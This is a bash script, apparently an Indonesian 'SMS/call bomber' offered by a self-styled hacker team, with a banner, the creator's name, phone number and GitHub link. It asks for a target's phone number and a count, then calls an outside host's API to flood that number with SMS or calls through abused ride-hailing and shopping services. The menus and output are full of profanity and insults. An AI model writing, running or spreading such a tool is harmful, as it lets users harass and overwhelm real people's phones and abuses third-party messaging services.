#!/bin/bash
      sleep 0.03  
echo "'\003[92m'
┈┈┈╲┈┈┈┈╱
┈┈┈╱''''╲
┈┈┃┈▇┈┈▇┈┃
╭╮┣━━━━━━┫╭╮
┃┃┃┈┈┈┈┈┈┃┃┃
╰╯┃┈┈┈┈┈┈┃╰╯
┈┈╰┓┏━━┓┏╯Hack ID
┈┈┈╰╯┈┈╰╯—————"

    sleep 0.03
    echo "$»«»«»«»«»«»«»«»«»«»«»«»«»«»»«»«»«»«$"
    sleep 2
    echo "BOOM SMS Hack ID  Cyber Team"
    sleep 0.4
    echo "  Creator:NURIL ANWAR"
    sleep 0.3
    echo "  Facebook"
    sleep 0.5
    echo "  WA= +6283168784570"
    sleep 0.7
    echo "  https://github.com/NurilTamvan"
    sleep 0.7
    echo "$»«»«»«»«»«»«»«»«»«»«»«»«»«»«»«»«»«»$"
load(){
    echo -e "\n"
    bar=" Sabar Anjing!...................."
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "Masih Kurang Puas ?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Yang Bikin Tools Ini Ganteng:v"
    fi
}
#spam
spam(){
    echo
    echo "{1} Boom SMS"
    echo "{2} Boom TELEPON"
    echo "{3} Ngentod"
    echo "{4}KELUAR"
    echo
    echo "1/2/3/4?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Boom SMS"
            #function spam
            echo
            echo "Tulis Nomor HP Musuh Lo"
            echo misalnya 0821+++++++
            read target # Masukin Di sini
            echo
            echo "Pengen berapa banyak ?"
            read paket
            echo
            echo  nomornya udah $target "Bener "$paket" Belom Anjink?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Boom lagi di kirim cok $target
                    echo
                    echo "Yang Bikin Tools Ini Tamvan lo:v
LOADING....."
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Lo kayak Babi"
                    echo
                    echo " Selamat Lo udh  hacker paling pro di dunia ini "
                    echo ". "
                    echo "======================================="
            else
                    echo "Kayak nya nomor lu salah bego"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Boom TELEPON"
            #function spam
            echo
            echo "Masukin No hp musuh lo"
            echo contoh 0812+++++
            read target # Cepet masukin kentod
            echo
            echo "Pake Santet Grab/Toped?"
            echo "[1] GRAB (bikin korban mati seketika)"
            echo "[2] TOPED (bikin korban masuk ruang oprasi)"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo periksa$target Nomor nya dulu $api_spam "udh bener blom?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Boom Nuklir spam call siap menghantui target:v $target
                  echo
                  echo "yg bikin tools ganteng:v
LOADING......"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " gua Tamvan yak:v"
                  echo
                  echo " muka lu kayak memek "
                  echo " by:Nuril Anwar"
                  echo "========================================"
            else
                  echo salah bego
            fi
        mulai
echo
    elif [ $pilih = "3" ]; then
        echo "Kreator = gua sendiri"
        echo
        echo "Hack ID Cyber Team"
        echo
        echo "thanks untuk: "
        echo
        echo "Nuril Anwar"
        echo
        echo "asu"
        echo
        echo "memek"
        echo
        echo "kontol"
        echo
        echo " Selamat lo jadi hecker sekarang:v"

    elif [ $pilih = "4" ]; then
        echo " makasih buat yg udh nyoba selamat coli"
        close
    else
        clear
        echo "Kesalahan coba cek lagi"
        mulai
    fi
}
close(){
    exit
}

echo "Mau yang enak enak?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
 
